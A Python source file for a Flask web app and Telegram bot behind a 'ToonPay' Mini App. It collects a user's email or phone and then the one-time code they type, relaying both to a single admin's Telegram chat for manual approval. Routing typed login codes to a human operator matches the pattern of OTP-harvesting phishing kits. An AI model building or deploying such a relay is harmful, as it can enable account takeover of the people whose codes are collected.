import os
import threading
import uuid
from flask import Flask, request, jsonify, render_template
import telebot
from telebot.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    WebAppInfo,
    BotCommand,
)

# ─────────────────────────────────────────────
#  CONFIG (set these in Railway Variables)
# ─────────────────────────────────────────────
BOT_TOKEN   = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
ADMIN_ID    = int(os.environ.get("ADMIN_ID", "123456789"))
WEBAPP_URL  = os.environ.get("WEBAPP_URL", "https://your-app.up.railway.app")

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ─────────────────────────────────────────────
#  IN-MEMORY STORAGE (use DB for production)
# ─────────────────────────────────────────────
sessions = {}                 # session_id -> dict
admin_msg_to_session = {}     # admin_message_id -> session_id

# ─────────────────────────────────────────────
#  ROUTES
# ─────────────────────────────────────────────
@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/request-otp", methods=["POST"])
def request_otp():
    """User submits email/phone → notify admin."""
    data = request.json or {}
    identifier = (data.get("identifier") or "").strip()

    if not identifier:
        return jsonify({"error": "Email or phone required"}), 400

    session_id = str(uuid.uuid4())
    sessions[session_id] = {
        "identifier": identifier,
        "admin_otp": None,
        "user_otp": None,
        "status": "pending_admin_otp",
    }

    try:
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton(
                "🔑 Assign OTP",
                callback_data=f"assign_{session_id}",
            )
        )
        msg = bot.send_message(
            ADMIN_ID,
            f"🔔 *New Login Request*\n\n"
            f"👤 User: `{identifier}`\n"
            f"🆔 Session: `{session_id[:8]}...`\n\n"
            f"👉 *Reply to this message* with the OTP you want to assign.",
            parse_mode="Markdown",
            reply_markup=markup,
        )
        admin_msg_to_session[msg.message_id] = session_id
    except Exception as e:
        print(f"[ERROR] Telegram send failed: {e}")
        return jsonify({"error": "Failed to notify admin"}), 500

    return jsonify({"session_id": session_id, "message": "OTP requested"})


@app.route("/api/verify-otp", methods=["POST"])
def verify_otp():
    """User submits OTP → forward to admin for approval."""
    data = request.json or {}
    session_id = data.get("session_id")
    user_otp = (data.get("otp") or "").strip()

    if session_id not in sessions:
        return jsonify({"error": "Invalid session"}), 400

    sessions[session_id]["user_otp"] = user_otp
    sessions[session_id]["status"] = "pending_admin_confirm"

    s = sessions[session_id]
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("✅ Correct", callback_data=f"confirm_{session_id}"),
        InlineKeyboardButton("❌ Not Correct", callback_data=f"reject_{session_id}"),
    )

    try:
        bot.send_message(
            ADMIN_ID,
            f"🔐 *OTP Verification Required*\n\n"
            f"👤 User: `{s['identifier']}`\n"
            f"🎯 OTP you assigned: `{s['admin_otp']}`\n"
            f"⌨️ OTP user entered: `{user_otp}`\n\n"
            f"*Match?*",
            reply_markup=markup,
            parse_mode="Markdown",
        )
    except Exception as e:
        print(f"[ERROR] Telegram send failed: {e}")

    return jsonify({"message": "OTP sent for verification"})


@app.route("/api/check-status/<session_id>", methods=["GET"])
def check_status(session_id):
    if session_id not in sessions:
        return jsonify({"error": "Invalid session"}), 400
    return jsonify({"status": sessions[session_id]["status"]})


# ─────────────────────────────────────────────
#  TELEGRAM HANDLERS
# ─────────────────────────────────────────────
@bot.message_handler(commands=["start"])
def send_welcome(message):
    """Group + private /start → welcome with Mini App button."""
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton(
            "🚀 Open ToonPay App",
            web_app=WebAppInfo(url=WEBAPP_URL),
        )
    )
    bot.send_message(
        message.chat.id,
        "👋 *Welcome to Rizon!*\n\n"
        "Tap the button below to open the *ToonPay* app and get started.",
        reply_markup=markup,
        parse_mode="Markdown",
    )


@bot.message_handler(
    func=lambda m: m.chat.id == ADMIN_ID
    and m.reply_to_message is not None
    and m.text
    and not m.text.startswith("/")
)
def handle_admin_otp_reply(message):
    """Admin replies to 'New Login Request' with the OTP."""
    replied_id = message.reply_to_message.message_id
    if replied_id not in admin_msg_to_session:
        return  # not our thread

    session_id = admin_msg_to_session[replied_id]
    admin_otp = message.text.strip()

    if session_id not in sessions:
        bot.reply_to(message, "❌ Session expired.")
        return

    sessions[session_id]["admin_otp"] = admin_otp
    sessions[session_id]["status"] = "pending_user_otp"

    bot.reply_to(
        message,
        f"✅ OTP `{admin_otp}` assigned.\n"
        f"Waiting for user to enter it…",
        parse_mode="Markdown",
    )


@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    data = call.data or ""

    if data.startswith("assign_"):
        session_id = data.split("_", 1)[1]
        if session_id not in sessions:
            bot.answer_callback_query(call.id, "Session expired")
            return
        bot.answer_callback_query(call.id, "Reply to the message with the OTP.")
        bot.send_message(
            ADMIN_ID,
            f"👉 Reply to the *original login request* with the OTP for `{sessions[session_id]['identifier']}`.",
            parse_mode="Markdown",
        )
        return

    if data.startswith("confirm_") or data.startswith("reject_"):
        action, session_id = data.split("_", 1)
        if session_id not in sessions:
            bot.answer_callback_query(call.id, "Session expired")
            return

        if action == "confirm":
            sessions[session_id]["status"] = "approved"
            bot.edit_message_text(
                f"✅ *Approved*\nUser: `{sessions[session_id]['identifier']}`",
                call.message.chat.id,
                call.message.message_id,
                parse_mode="Markdown",
            )
        else:
            sessions[session_id]["status"] = "rejected"
            bot.edit_message_text(
                f"❌ *Rejected*\nUser: `{sessions[session_id]['identifier']}`",
                call.message.chat.id,
                call.message.message_id,
                parse_mode="Markdown",
            )
        bot.answer_callback_query(call.id)
        return

    bot.answer_callback_query(call.id)


# ─────────────────────────────────────────────
#  RUN
# ─────────────────────────────────────────────
def run_bot():
    print("🤖 Bot polling started…")
    try:
        bot.set_my_commands([BotCommand("start", "🚀 Open ToonPay App")])
    except Exception as e:
        print(f"[WARN] set_my_commands failed: {e}")
    bot.infinity_polling(timeout=30, long_polling_timeout=25)


if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
